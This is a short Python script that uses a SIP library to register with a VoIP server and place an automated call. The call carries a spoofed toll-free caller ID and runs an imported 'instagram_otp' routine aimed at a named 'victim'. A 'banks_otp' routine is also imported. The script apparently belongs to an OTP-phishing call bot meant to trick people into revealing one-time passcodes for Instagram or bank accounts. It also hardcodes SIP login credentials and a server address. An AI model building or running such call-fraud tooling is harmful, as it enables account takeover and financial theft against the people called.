import asyncio
from PySIP.sip_account import SipAccount
from scripts.banks_otp import bank_script
from scripts.instagram_otp import instagram_script

# account = SipAccount('3001', '30013001', '192.168.1.112:5060')
account = SipAccount('michel2', 'pass1234', '109.207.170.23:5060', connection_type='UDP', caller_id='18006669320')

# call = account.make_call('12045148765')
# print(call)


async def main():
    await account.register()
    
    call = account.make_call('12045148765')
    call_task = asyncio.create_task(call.start())

    await instagram_script(
        call.call_handler,
        victim_name="John"
    )

    await call_task
    await account.unregister()


if __name__ == "__main__":
    asyncio.run(main())
    # loop.run_until_complete(asyncio.sleep(2))
    # account.unregister_sync()
    # loop.close()
